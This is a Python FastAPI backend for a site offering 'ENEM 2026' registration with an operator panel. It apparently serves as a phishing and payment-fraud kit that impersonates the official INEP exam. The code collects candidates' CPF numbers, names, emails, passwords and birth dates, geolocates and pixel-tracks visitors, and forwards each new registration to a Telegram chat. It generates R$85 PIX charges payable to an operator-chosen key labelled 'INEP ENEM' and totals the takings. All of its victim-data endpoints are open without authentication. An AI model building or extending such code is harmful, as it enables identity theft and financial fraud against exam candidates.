"""
Backend FastAPI para o sistema ENEM 2026 + Painel Donas
Persistência em MongoDB. Telegram disparado APENAS na criação de inscrição.
"""
from fastapi import FastAPI, APIRouter, Request, HTTPException
from fastapi.responses import JSONResponse, Response
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import uuid
import re
import asyncio
import httpx
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional, Dict, Any
from datetime import datetime, timezone


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

app = FastAPI()
api_router = APIRouter(prefix="/api")
donas = APIRouter(prefix="/donas", tags=["donas"])

logger = logging.getLogger("server")

# ===================== Telegram defaults =====================
# IMPORTANT: NO hardcoded credentials. Telegram is controlled 100% by the admin panel.
TG_DEFAULTS = {
    "tgBotToken": "",
    "tgChatId": "",
    "tgEnabled": False,
}


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def only_digits(s: Optional[str]) -> str:
    return re.sub(r"\D", "", s or "")


def device_from_ua(ua: str) -> str:
    return "Mobile" if re.search(r"Mobi|Android|iPhone|iPad", ua or "", re.I) else "Desktop"


async def get_config() -> Dict[str, Any]:
    cfg = await db.donas_config.find_one({"_id": "singleton"}) or {}
    out = {**TG_DEFAULTS, **{k: v for k, v in cfg.items() if k != "_id"}}
    return out


# ===================== Modelos =====================
class CadastroIn(BaseModel):
    model_config = ConfigDict(extra="allow")
    cpf: str
    nome: Optional[str] = None
    email: Optional[str] = None
    senha: Optional[str] = None


class InscricaoIn(BaseModel):
    model_config = ConfigDict(extra="allow")
    cpf: Optional[str] = None
    candidato: Optional[str] = None
    cargo: Optional[str] = None
    email: Optional[str] = None
    titulo: Optional[str] = None
    dispositivo: Optional[str] = None
    numero: Optional[str] = None


class AcessoIn(BaseModel):
    model_config = ConfigDict(extra="allow")
    device: Optional[str] = None
    ua: Optional[str] = None
    path: Optional[str] = None


class EventoIn(BaseModel):
    model_config = ConfigDict(extra="allow")
    tipo: str
    cpf: Optional[str] = None
    candidato: Optional[str] = None
    dispositivo: Optional[str] = None


class ConfigIn(BaseModel):
    model_config = ConfigDict(extra="allow")
    tgBotToken: Optional[str] = None
    tgChatId: Optional[str] = None
    tgEnabled: Optional[bool] = None
    pixKey: Optional[str] = None
    pixNome: Optional[str] = None
    pixCidade: Optional[str] = None


class StatusPatch(BaseModel):
    status: str


# ===================== Telegram helpers =====================
def tg_fmt_date(iso: Optional[str]) -> str:
    try:
        dt = datetime.fromisoformat(iso.replace("Z", "+00:00")) if iso else datetime.now(timezone.utc)
    except Exception:
        dt = datetime.now(timezone.utc)
    return dt.strftime("%d/%m/%Y às %H:%M")


def tg_status_emoji(s: str) -> str:
    return {
        "Aguardando pagamento": "🟡",
        "PIX gerado": "🔵",
        "PIX copiado": "🟢",
        "PIX baixado": "🟣",
    }.get(s, "🟡")


def tg_build_msg(insc: Dict[str, Any]) -> str:
    cpf_digits = only_digits(insc.get("cpf"))
    cpf_fmt = (
        f"{cpf_digits[:3]}.{cpf_digits[3:6]}.{cpf_digits[6:9]}-{cpf_digits[9:]}"
        if len(cpf_digits) == 11 else (cpf_digits or "—")
    )
    nome = (insc.get("candidato") or "").strip().upper() or "—"
    disp = insc.get("dispositivo") or "—"
    city = insc.get("city") or "—"
    region = insc.get("region") or "—"
    status = insc.get("status") or "Aguardando pagamento"
    return (
        "NOVA INSCRIÇÃO ENEM 2026\n"
        "━━━━━━━━━━━━━━━━━\n"
        "\n"
        f"👤 Usuário: {nome}\n"
        f"🔐 CPF: {cpf_fmt}\n"
        f"📅 Data/hora: {tg_fmt_date(insc.get('criadoEm'))}\n"
        f"📱 Dispositivo: {disp}\n"
        f"📍 Local: {city}/{region}\n"
        f"📊 Status: {tg_status_emoji(status)} {status}"
    )


async def tg_send(insc: Dict[str, Any]) -> Optional[int]:
    cfg = await get_config()
    if not cfg.get("tgEnabled") or not cfg.get("tgBotToken") or not cfg.get("tgChatId"):
        return None
    url = f"https://api.telegram.org/bot{cfg['tgBotToken']}/sendMessage"
    try:
        async with httpx.AsyncClient(timeout=10) as cli:
            r = await cli.post(url, json={"chat_id": cfg["tgChatId"], "text": tg_build_msg(insc)})
            data = r.json()
            if data.get("ok") and data.get("result"):
                return data["result"].get("message_id")
    except Exception as e:
        logger.warning(f"tg_send falhou: {e}")
    return None


async def tg_edit(insc: Dict[str, Any], new_status: str) -> None:
    cfg = await get_config()
    if not cfg.get("tgEnabled") or not cfg.get("tgBotToken") or not cfg.get("tgChatId"):
        return
    mid = insc.get("tgMessageId")
    if not mid:
        return
    updated = {**insc, "status": new_status}
    url = f"https://api.telegram.org/bot{cfg['tgBotToken']}/editMessageText"
    try:
        async with httpx.AsyncClient(timeout=10) as cli:
            await cli.post(url, json={
                "chat_id": cfg["tgChatId"],
                "message_id": mid,
                "text": tg_build_msg(updated),
            })
    except Exception as e:
        logger.warning(f"tg_edit falhou: {e}")


# ===================== Geo a partir do IP =====================
# Cache em memória do geo lookup. Em produção, vários acessos vêm do mesmo IP
# (residencial, mobile NAT, escola). Cachear evita estourar o rate limit do
# provider externo e elimina o gargalo principal de POSTs sob carga.
_GEO_CACHE: Dict[str, Dict[str, str]] = {}
_GEO_FAIL_TS: Dict[str, float] = {}  # IPs que falharam recentemente (cooldown)
_GEO_CACHE_MAX = 10000

def _geo_cache_put(ip: str, value: Dict[str, str]) -> None:
    if len(_GEO_CACHE) >= _GEO_CACHE_MAX:
        # FIFO simples — remove ~20% mais antigos
        for k in list(_GEO_CACHE.keys())[: _GEO_CACHE_MAX // 5]:
            _GEO_CACHE.pop(k, None)
    _GEO_CACHE[ip] = value


async def geo_from_ip(ip: str) -> Dict[str, str]:
    if not ip or ip.startswith("127.") or ip.startswith("10.") or ip.startswith("192.168."):
        return {}
    # Cache hit
    if ip in _GEO_CACHE:
        return _GEO_CACHE[ip]
    # Cooldown de 5 min para IPs que falharam recentemente (evita travar a request principal)
    import time as _t
    fail_ts = _GEO_FAIL_TS.get(ip)
    if fail_ts and (_t.time() - fail_ts) < 300:
        return {"ip": ip}

    # Primary: ipwho.is — timeout curto (2s) para nunca segurar a request por muito tempo
    try:
        async with httpx.AsyncClient(timeout=2) as cli:
            r = await cli.get(f"https://ipwho.is/{ip}")
            d = r.json() or {}
            if d.get("success") is not False and (d.get("city") or d.get("region")):
                out = {
                    "ip": d.get("ip") or ip,
                    "city": d.get("city") or "",
                    "region": d.get("region") or "",
                    "country": d.get("country") or "",
                }
                _geo_cache_put(ip, out)
                return out
    except Exception:
        pass
    # Fallback 1: ip-api.com (free, sem chave, HTTP, mais resiliente em redes restritas)
    try:
        async with httpx.AsyncClient(timeout=1.5) as cli:
            r = await cli.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,query")
            d = r.json() or {}
            if d.get("status") == "success" and (d.get("city") or d.get("regionName")):
                out = {
                    "ip": d.get("query") or ip,
                    "city": d.get("city") or "",
                    "region": d.get("regionName") or "",
                    "country": d.get("country") or "",
                }
                _geo_cache_put(ip, out)
                return out
    except Exception:
        pass
    # Fallback 2: ipapi.co
    try:
        async with httpx.AsyncClient(timeout=1.5) as cli:
            r = await cli.get(f"https://ipapi.co/{ip}/json/")
            d = r.json() or {}
            out = {
                "ip": d.get("ip") or ip,
                "city": d.get("city") or "",
                "region": d.get("region") or "",
                "country": d.get("country_name") or "",
            }
            if out.get("city") or out.get("region"):
                _geo_cache_put(ip, out)
                return out
    except Exception:
        pass

    # Ambos falharam — registra cooldown e retorna só o IP (não bloqueia a request principal)
    _GEO_FAIL_TS[ip] = _t.time()
    return {"ip": ip}


def client_ip(req: Request) -> str:
    xf = req.headers.get("x-forwarded-for")
    if xf:
        return xf.split(",")[0].strip()
    return (req.client.host if req.client else "") or ""


async def _enrich_geo_bg(collection_name: str, doc_id: str, ip: str) -> None:
    """Faz geo lookup em background e atualiza o documento.
    Não bloqueia a resposta da API. Usa cache em memória, então repetições
    do mesmo IP custam ~0ms."""
    try:
        # Se já tem no cache, atualiza imediato. Senão, faz a chamada externa.
        geo = await geo_from_ip(ip)
        if not geo:
            return
        upd = {}
        if geo.get("city"):    upd["city"] = geo["city"]
        if geo.get("region"):  upd["region"] = geo["region"]
        if geo.get("country"): upd["country"] = geo["country"]
        if geo.get("ip"):      upd["ip"] = geo["ip"]
        if not upd:
            return
        coll = getattr(db, collection_name)
        await coll.update_one({"_id": doc_id}, {"$set": upd})
    except Exception:
        # Falha silenciosa — registro persiste sem geo
        pass


def schedule_geo(collection_name: str, doc_id: str, ip: str) -> None:
    """Dispara o enriquecimento em background sem aguardar (fire-and-forget).
    Em caso de IP já cacheado, o trabalho será praticamente instantâneo."""
    if not ip or ip.startswith("127.") or ip.startswith("10.") or ip.startswith("192.168."):
        return
    # Atalho: se já está cacheado, faz update síncrono inline (rápido)
    if ip in _GEO_CACHE:
        # ainda assim sai do hot path da resposta
        asyncio.create_task(_enrich_geo_bg(collection_name, doc_id, ip))
        return
    asyncio.create_task(_enrich_geo_bg(collection_name, doc_id, ip))


# ===================== Health =====================
@api_router.get("/")
async def root():
    return {"message": "ENEM/Donas API", "status": "ok"}


# ===================== Cadastros =====================
@donas.post("/cadastros")
async def upsert_cadastro(payload: CadastroIn):
    data = payload.model_dump()
    cpf = only_digits(data.get("cpf"))
    if not cpf:
        raise HTTPException(400, "cpf obrigatório")
    existing = await db.donas_cadastros.find_one({"_id": cpf})
    data["_id"] = cpf
    data["cpf"] = cpf
    data["__updatedAt"] = now_iso()
    if not existing:
        data["__createdAt"] = now_iso()
    else:
        data["__createdAt"] = existing.get("__createdAt") or now_iso()
    await db.donas_cadastros.replace_one({"_id": cpf}, data, upsert=True)
    out = {**data}
    out.pop("_id", None)
    return out


@donas.get("/cadastros")
async def list_cadastros():
    rows = await db.donas_cadastros.find({}).to_list(50000)
    for r in rows:
        r["cpf"] = r.pop("_id", r.get("cpf"))
    return rows


@donas.get("/cadastros/{cpf}")
async def get_cadastro(cpf: str):
    """Retorna o cadastro permanente do usuário pelo CPF. 404 se não existir.
    O cadastro é populado automaticamente quando uma inscrição é enviada,
    e NÃO é removido quando o admin limpa as inscrições — funciona como
    memória permanente do usuário."""
    cpf_digits = only_digits(cpf)
    if not cpf_digits:
        raise HTTPException(400, "cpf inválido")
    cad = await db.donas_cadastros.find_one({"_id": cpf_digits})
    if not cad:
        raise HTTPException(404, "cadastro não encontrado")
    cad["cpf"] = cad.pop("_id", cad.get("cpf"))
    return cad


@donas.delete("/cadastros/{cpf}")
async def delete_cadastro(cpf: str):
    cpf = only_digits(cpf)
    res = await db.donas_cadastros.delete_one({"_id": cpf})
    return {"deleted": res.deleted_count}


@donas.delete("/cadastros")
async def clear_cadastros():
    res = await db.donas_cadastros.delete_many({})
    return {"deleted": res.deleted_count}


async def _upsert_cadastro_from_inscricao(doc: Dict[str, Any]) -> None:
    """Salva o usuário em `donas_cadastros` como memória permanente.
    Chamado sempre que uma inscrição é criada/atualizada. Esta coleção
    sobrevive a uma limpeza de inscrições — é a fonte de verdade do
    usuário para futuras recriações automáticas."""
    cpf = only_digits(doc.get("cpf"))
    if not cpf:
        return
    payload = doc.get("payload") or {}
    cad_doc = {
        "_id": cpf,
        "cpf": cpf,
        "nome": doc.get("candidato") or "",
        "email": doc.get("email") or "",
        "dispositivo": doc.get("dispositivo") or "",
        "ip": doc.get("ip") or "",
        "city": doc.get("city") or "",
        "region": doc.get("region") or "",
        "country": doc.get("country") or "",
        "dataNascimento": payload.get("dataNascimento") or "",
        "payload": payload,
        "__updatedAt": now_iso(),
    }
    existing = await db.donas_cadastros.find_one({"_id": cpf})
    if existing:
        cad_doc["__createdAt"] = existing.get("__createdAt") or now_iso()
    else:
        cad_doc["__createdAt"] = now_iso()
    await db.donas_cadastros.replace_one({"_id": cpf}, cad_doc, upsert=True)


# ===================== Inscrições =====================
@donas.post("/inscricoes")
async def create_inscricao(payload: InscricaoIn, request: Request):
    data = payload.model_dump()
    ip = client_ip(request)
    ua = request.headers.get("user-agent", "")
    # Geo cacheado? Usa imediatamente. Senão, grava sem e enriquece em background.
    geo = _GEO_CACHE.get(ip, {})
    cpf = only_digits(data.get("cpf"))

    # If an inscrição already exists for this CPF, keep the same número but UPDATE
    # the payload + dados do candidato so latest selections (lingua, UF, município, etc.) are reflected.
    if cpf:
        existing = await db.donas_inscricoes.find_one({"cpf": cpf})
        if existing:
            update_fields = {}
            new_payload = data.get("payload")
            if new_payload:
                update_fields["payload"] = new_payload
            for fld in ("candidato", "email", "dispositivo"):
                v = data.get(fld)
                if v:
                    update_fields[fld] = v
            if update_fields:
                await db.donas_inscricoes.update_one({"_id": existing["_id"]}, {"$set": update_fields})
                existing.update(update_fields)
            # Atualiza também o cadastro permanente
            await _upsert_cadastro_from_inscricao(existing)
            existing.pop("_id", None)
            return existing

    # Tenta enriquecer com dados do cadastro permanente
    # (útil quando o admin limpou as inscrições mas o usuário volta).
    cadastro = await db.donas_cadastros.find_one({"_id": cpf}) if cpf else None
    if cadastro:
        data.setdefault("candidato", cadastro.get("nome") or data.get("candidato"))
        data.setdefault("email", cadastro.get("email") or data.get("email"))
        # Se o caller não trouxe payload, reaproveita o payload completo do cadastro
        if not data.get("payload") and cadastro.get("payload"):
            data["payload"] = cadastro.get("payload")

    insc_id = str(uuid.uuid4())
    if not data.get("numero"):
        data["numero"] = "260000" + str(uuid.uuid4().int)[:6]

    doc = {
        "_id": insc_id,
        "id": insc_id,
        "cpf": cpf,
        "candidato": data.get("candidato") or "",
        "email": data.get("email") or "",
        "cargo": data.get("cargo") or "",
        "titulo": data.get("titulo") or "ENEM 2026 - Inscrição",
        "numero": data.get("numero"),
        "status": "Aguardando pagamento",
        "pixGeradoOnce": False,
        "pixCopiadoOnce": False,
        "pixBaixadoOnce": False,
        "dispositivo": data.get("dispositivo") or device_from_ua(ua),
        "ip": geo.get("ip") or ip,
        "city": geo.get("city") or "",
        "region": geo.get("region") or "",
        "country": geo.get("country") or "",
        "ua": ua[:200],
        "criadoEm": now_iso(),
        "payload": data.get("payload") or {},
    }
    await db.donas_inscricoes.insert_one(doc)

    # Geo lookup em background (não bloqueia a resposta)
    if not geo:
        schedule_geo("donas_inscricoes", insc_id, ip)

    # Persiste cadastro permanente (memória do usuário)
    await _upsert_cadastro_from_inscricao(doc)

    # Dispara Telegram apenas aqui (criação de inscrição)
    mid = await tg_send(doc)
    if mid:
        await db.donas_inscricoes.update_one({"_id": insc_id}, {"$set": {"tgMessageId": mid}})
        doc["tgMessageId"] = mid

    doc.pop("_id", None)
    return doc


@donas.get("/inscricoes")
async def list_inscricoes():
    rows = await db.donas_inscricoes.find({}).sort("criadoEm", -1).to_list(50000)
    for r in rows:
        r.pop("_id", None)
    return rows


@donas.get("/inscricoes/by-cpf/{cpf}")
async def get_inscricao_by_cpf(cpf: str):
    """
    Retorna a inscrição existente no banco para o CPF informado.
    Usado pelo home.html para detectar usuários que já enviaram a inscrição
    e redirecioná-los direto para a página de sucesso, pulando o fluxo manual.
    Retorna 404 caso não exista inscrição para o CPF.
    """
    cpf_digits = only_digits(cpf)
    if not cpf_digits:
        raise HTTPException(400, "cpf inválido")
    insc = await db.donas_inscricoes.find_one({"cpf": cpf_digits})
    if not insc:
        raise HTTPException(404, "inscrição não encontrada")
    insc.pop("_id", None)
    return insc


@donas.patch("/inscricoes/{insc_id}")
async def patch_inscricao(insc_id: str, payload: StatusPatch):
    insc = await db.donas_inscricoes.find_one({"_id": insc_id})
    if not insc:
        raise HTTPException(404, "inscrição não encontrada")
    new_status = payload.status
    update = {"status": new_status}
    # Flags one-shot (anti-duplicação dos contadores)
    if new_status == "PIX gerado" and not insc.get("pixGeradoOnce"):
        update["pixGeradoOnce"] = True
    if new_status == "PIX copiado" and not insc.get("pixCopiadoOnce"):
        update["pixCopiadoOnce"] = True
    if new_status == "PIX baixado" and not insc.get("pixBaixadoOnce"):
        update["pixBaixadoOnce"] = True
    await db.donas_inscricoes.update_one({"_id": insc_id}, {"$set": update})
    # Atualiza mensagem do Telegram (edita a existente)
    await tg_edit(insc, new_status)
    insc.update(update)
    insc.pop("_id", None)
    return insc


@donas.delete("/inscricoes/{insc_id}")
async def delete_inscricao(insc_id: str):
    res = await db.donas_inscricoes.delete_one({"_id": insc_id})
    return {"deleted": res.deleted_count}


@donas.delete("/inscricoes")
async def clear_inscricoes():
    res = await db.donas_inscricoes.delete_many({})
    return {"deleted": res.deleted_count}


# ===================== Acessos =====================
@donas.post("/acessos")
async def log_acesso(payload: AcessoIn, request: Request):
    data = payload.model_dump()
    ip = client_ip(request)
    ua = request.headers.get("user-agent", "")
    # Geo cacheado? Usa imediatamente. Senão, grava sem geo e enriquece em background.
    geo = _GEO_CACHE.get(ip, {})
    doc_id = str(uuid.uuid4())
    doc = {
        "_id": doc_id,
        "ts": now_iso(),
        "ip": geo.get("ip") or ip,
        "city": geo.get("city") or "",
        "region": geo.get("region") or "",
        "country": geo.get("country") or "",
        "device": data.get("device") or device_from_ua(ua),
        "ua": (data.get("ua") or ua)[:200],
        "path": data.get("path") or "",
    }
    await db.donas_acessos.insert_one(doc)
    if not geo:
        schedule_geo("donas_acessos", doc_id, ip)
    doc.pop("_id", None)
    return doc


@donas.get("/acessos")
async def list_acessos():
    rows = await db.donas_acessos.find({}).sort("ts", -1).to_list(50000)
    for r in rows:
        r.pop("_id", None)
    return rows


@donas.delete("/acessos")
async def clear_acessos():
    res = await db.donas_acessos.delete_many({})
    return {"deleted": res.deleted_count}


@donas.post("/acessos/backfill-geo")
async def backfill_geo_acessos():
    """Tenta resolver geo (city/region) para acessos antigos sem cidade.
    Útil quando o lookup automático em background falhou (rate limit, etc).
    Processa até 200 por chamada para evitar bloqueios longos."""
    cursor = db.donas_acessos.find(
        {"$and": [
            {"ip": {"$ne": ""}},
            {"$or": [{"city": ""}, {"city": {"$exists": False}}]}
        ]},
        {"_id": 1, "ip": 1}
    ).limit(200)
    docs = await cursor.to_list(200)
    updated = 0
    for d in docs:
        ip = d.get("ip") or ""
        if not ip or ip.startswith("127.") or ip.startswith("10.") or ip.startswith("192.168."):
            continue
        geo = await geo_from_ip(ip)
        if not geo or not (geo.get("city") or geo.get("region")):
            continue
        upd = {}
        if geo.get("city"):    upd["city"] = geo["city"]
        if geo.get("region"):  upd["region"] = geo["region"]
        if geo.get("country"): upd["country"] = geo["country"]
        if upd:
            await db.donas_acessos.update_one({"_id": d["_id"]}, {"$set": upd})
            updated += 1
    return {"processed": len(docs), "updated": updated}


# Pixel tracker GIF 1x1 transparente — resiliente a ad blockers, CSP, sendBeacon
# bloqueado, JS desabilitado etc. Basta um <img src=".../pixel.gif"> no HTML.
_PIXEL_GIF = bytes.fromhex("47494638396101000100800000000000ffffff21f90401000000002c000000000100010000020144003b")

@donas.get("/acessos/pixel.gif")
async def acesso_pixel(request: Request, p: str = ""):
    """Tracking pixel via GET — alternativa a sendBeacon/fetch.
    Param `p` é o path da página (opcional). Não bloqueia, sempre retorna 200 + GIF."""
    try:
        ip = client_ip(request)
        ua = request.headers.get("user-agent", "")
        # Dedupe leve: se mesmo IP+UA bateu nos últimos 30s, ignora (browser pode pre-fetch a imagem)
        from time import time as _t
        cache_key = f"{ip}|{ua[:80]}"
        now = _t()
        recent = _PIXEL_DEDUPE.get(cache_key)
        if recent and (now - recent) < 30:
            return Response(content=_PIXEL_GIF, media_type="image/gif",
                            headers={"Cache-Control": "no-store, no-cache, must-revalidate", "Pragma": "no-cache"})
        _PIXEL_DEDUPE[cache_key] = now
        # Limpa cache antigo periodicamente
        if len(_PIXEL_DEDUPE) > 5000:
            for k in [k for k,v in _PIXEL_DEDUPE.items() if (now - v) > 60]:
                _PIXEL_DEDUPE.pop(k, None)

        geo = _GEO_CACHE.get(ip, {})
        doc_id = str(uuid.uuid4())
        doc = {
            "_id": doc_id,
            "ts": now_iso(),
            "ip": geo.get("ip") or ip,
            "city": geo.get("city") or "",
            "region": geo.get("region") or "",
            "country": geo.get("country") or "",
            "device": device_from_ua(ua),
            "ua": ua[:200],
            "path": (p or "/")[:200],
            "source": "pixel",
        }
        await db.donas_acessos.insert_one(doc)
        if not geo:
            schedule_geo("donas_acessos", doc_id, ip)
    except Exception as e:
        logger.exception("pixel tracker fail: %s", e)
    return Response(content=_PIXEL_GIF, media_type="image/gif",
                    headers={"Cache-Control": "no-store, no-cache, must-revalidate", "Pragma": "no-cache"})


_PIXEL_DEDUPE: Dict[str, float] = {}


# ===================== Eventos genéricos =====================
# Tipos atuais: inscricao_iniciada (PIX gerado/copiado/baixado e inscrição enviada
# já são deriváveis de donas_inscricoes via tsGerado/tsCopiado/tsBaixado/criadoEm)
@donas.post("/eventos")
async def log_evento(payload: EventoIn, request: Request):
    data = payload.model_dump()
    ip = client_ip(request)
    ua = request.headers.get("user-agent", "")
    geo = _GEO_CACHE.get(ip, {})
    doc_id = str(uuid.uuid4())
    doc = {
        "_id": doc_id,
        "ts": now_iso(),
        "tipo": data.get("tipo") or "",
        "cpf": only_digits(data.get("cpf")),
        "candidato": (data.get("candidato") or "").strip(),
        "dispositivo": data.get("dispositivo") or device_from_ua(ua),
        "ip": geo.get("ip") or ip,
        "city": geo.get("city") or "",
        "region": geo.get("region") or "",
    }
    await db.donas_eventos.insert_one(doc)
    if not geo:
        schedule_geo("donas_eventos", doc_id, ip)
    doc.pop("_id", None)
    return doc


@donas.get("/eventos")
async def list_eventos():
    rows = await db.donas_eventos.find({}).sort("ts", -1).to_list(50000)
    for r in rows:
        r.pop("_id", None)
    return rows


@donas.delete("/eventos")
async def clear_eventos():
    res = await db.donas_eventos.delete_many({})
    return {"deleted": res.deleted_count}


# ===================== Stats / KPIs =====================
@donas.get("/stats")
async def stats():
    acessos = await db.donas_acessos.count_documents({})
    inscricoes = await db.donas_inscricoes.count_documents({})
    # Contadores baseados nas flags one-shot (não duplicam se usuário repetir ação)
    pix_gerados = await db.donas_inscricoes.count_documents({"pixGeradoOnce": True})
    pix_copiados = await db.donas_inscricoes.count_documents({"pixCopiadoOnce": True})
    pix_baixados = await db.donas_inscricoes.count_documents({"pixBaixadoOnce": True})

    TAXA_ENEM = 85.00
    total_inscricoes = await db.donas_inscricoes.count_documents({})
    valor_total = total_inscricoes * TAXA_ENEM
    valor_gerado = pix_gerados * TAXA_ENEM
    valor_copiado = pix_copiados * TAXA_ENEM
    valor_baixado = pix_baixados * TAXA_ENEM

    return {
        "acessos": acessos,
        "inscricoes": inscricoes,
        "valorTotal": round(valor_total, 2),
        "pixGerados": pix_gerados,
        "valorPixGerados": round(valor_gerado, 2),
        "pixCopiados": pix_copiados,
        "valorPixCopiados": round(valor_copiado, 2),
        "pixBaixados": pix_baixados,
        "valorPixBaixados": round(valor_baixado, 2),
    }


# ===================== Config =====================
@donas.get("/config")
async def cfg_get():
    return await get_config()


@donas.put("/config")
async def cfg_put(payload: ConfigIn):
    data = {k: v for k, v in payload.model_dump().items() if v is not None}
    if data:
        await db.donas_config.update_one(
            {"_id": "singleton"},
            {"$set": data},
            upsert=True,
        )
    return await get_config()


# ===================== PIX BR Code generation =====================
def _emv(tag: str, value: str) -> str:
    return f"{tag}{len(value):02d}{value}"


def _crc16_ccitt(payload: str) -> str:
    crc = 0xFFFF
    for b in payload.encode("utf-8"):
        crc ^= b << 8
        for _ in range(8):
            crc = ((crc << 1) ^ 0x1021) & 0xFFFF if (crc & 0x8000) else (crc << 1) & 0xFFFF
    return f"{crc:04X}"


def _strip_accents(s: str) -> str:
    import unicodedata
    return "".join(c for c in unicodedata.normalize("NFD", s or "") if unicodedata.category(c) != "Mn")


def build_pix_brcode(key: str, name: str, city: str, amount: float, txid: str) -> str:
    name = _strip_accents(name or "RECEBEDOR")[:25].upper()
    city = _strip_accents(city or "BRASIL")[:15].upper()
    txid = re.sub(r"[^A-Za-z0-9]", "", txid or "")[:25] or "PIX"
    merchant = _emv("00", "br.gov.bcb.pix") + _emv("01", key or "")
    payload = (
        _emv("00", "01") +
        _emv("26", merchant) +
        _emv("52", "0000") +
        _emv("53", "986") +
        _emv("54", f"{amount:.2f}") +
        _emv("58", "BR") +
        _emv("59", name) +
        _emv("60", city) +
        _emv("62", _emv("05", txid))
    )
    payload += "6304"
    return payload + _crc16_ccitt(payload)


@donas.get("/pix/{inscricao_id}")
async def pix_for_inscricao(inscricao_id: str):
    insc = await db.donas_inscricoes.find_one({"_id": inscricao_id})
    if not insc:
        # also try by numero
        insc = await db.donas_inscricoes.find_one({"numero": inscricao_id})
    if not insc:
        raise HTTPException(404, "Inscrição não encontrada")

    # Se o PIX já foi gerado antes para esta inscrição, mantemos o snapshot
    # da chave usada na PRIMEIRA geração (sobrevive a mudanças futuras no
    # painel admin). Caso contrário, lê a chave atual do config.
    snap_chave = (insc.get("pixChave") or "").strip()
    snap_nome  = (insc.get("pixChaveNome") or "").strip()
    snap_cidade = (insc.get("pixChaveCidade") or "").strip()

    if snap_chave:
        chave = snap_chave
        nome = snap_nome or "INEP ENEM"
        cidade = snap_cidade or "BRASILIA"
    else:
        cfg = await get_config()
        chave = (cfg.get("pixKey") or "").strip()
        if not chave:
            raise HTTPException(400, "Chave PIX não configurada no painel administrativo")
        nome = (cfg.get("pixNome") or "INEP ENEM").strip()
        cidade = (cfg.get("pixCidade") or "BRASILIA").strip()

    valor = 85.00
    txid = (insc.get("numero") or insc.get("id") or "PIX")
    brcode = build_pix_brcode(chave, nome, cidade, valor, txid)

    # mark pix gerado once + snapshot da chave usada
    if not insc.get("pixGeradoOnce"):
        await db.donas_inscricoes.update_one(
            {"_id": insc["_id"]},
            {"$set": {
                "pixGeradoOnce": True,
                "status": "PIX gerado",
                "tsGerado": now_iso(),
                "pixChave": chave,
                "pixChaveNome": nome,
                "pixChaveCidade": cidade,
            }}
        )
        # update telegram message status if applicable
        await tg_edit(insc, "PIX gerado")

    payload = insc.get("payload") or {}
    return {
        "numero": insc.get("numero") or "",
        "candidato": insc.get("candidato") or "",
        "cpf": insc.get("cpf") or "",
        "valor": valor,
        "valorFmt": "R$ 85,00",
        "brcode": brcode,
        "recebedor": nome,
        "cidade": cidade,
        "vencimento": "",
        "linguaEstrangeira": payload.get("linguaEstrangeira") or "",
        "ufProvaNome": payload.get("ufProvaNome") or payload.get("ufProva") or "",
        "municipioProva": payload.get("municipioProva") or "",
    }


@donas.post("/pix/{numero}/copiado")
async def pix_copiado(numero: str):
    return await _pix_status_update(numero, "PIX copiado", "pixCopiadoOnce")


@donas.post("/pix/{numero}/baixado")
async def pix_baixado(numero: str):
    return await _pix_status_update(numero, "PIX baixado", "pixBaixadoOnce")


async def _pix_status_update(ident: str, new_status: str, once_flag: str):
    insc = await db.donas_inscricoes.find_one({"_id": ident})
    if not insc:
        insc = await db.donas_inscricoes.find_one({"numero": ident})
    if not insc:
        raise HTTPException(404, "Inscrição não encontrada")
    if insc.get(once_flag):
        return {"ok": True, "status": insc.get("status"), "skipped": True}
    ts_field = {"pixCopiadoOnce": "tsCopiado", "pixBaixadoOnce": "tsBaixado"}.get(once_flag)
    update = {once_flag: True, "status": new_status}
    if ts_field:
        update[ts_field] = now_iso()
    await db.donas_inscricoes.update_one(
        {"_id": insc["_id"]},
        {"$set": update}
    )
    await tg_edit(insc, new_status)
    return {"ok": True, "status": new_status}


# ===================== Wire up =====================
api_router.include_router(donas)
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')


@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
